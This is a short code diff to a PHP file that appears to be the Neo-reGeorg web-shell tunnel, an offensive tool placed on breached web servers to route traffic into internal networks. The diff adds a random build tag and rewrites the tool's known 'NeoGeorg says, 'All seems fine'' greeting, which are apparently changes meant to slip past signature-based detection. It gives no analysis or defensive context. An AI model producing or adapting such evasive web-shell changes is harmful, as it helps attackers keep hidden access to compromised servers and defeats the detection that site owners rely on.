@@ -1,4 +1,5 @@
 <?php
+// Build: fodpbdrx
 ini_set("allow_url_fopen", true);
 ini_set("allow_url_include", true);
 ini_set('always_populate_raw_post_data', -1);
@@ -196,7 +197,7 @@ switch($cmd){
     }
 }
 if ( $sayhello ) {
-    echo base64_decode(strtr("NeoGeorg says, 'All seems fine'", $de, $en));
+    echo base64_decode(strtr("PugGeorg says, 'Endpoint ready'", $de, $en));
 } else {
     echo strtr(base64_encode(blv_encode($rinfo)), $en, $de);
 }
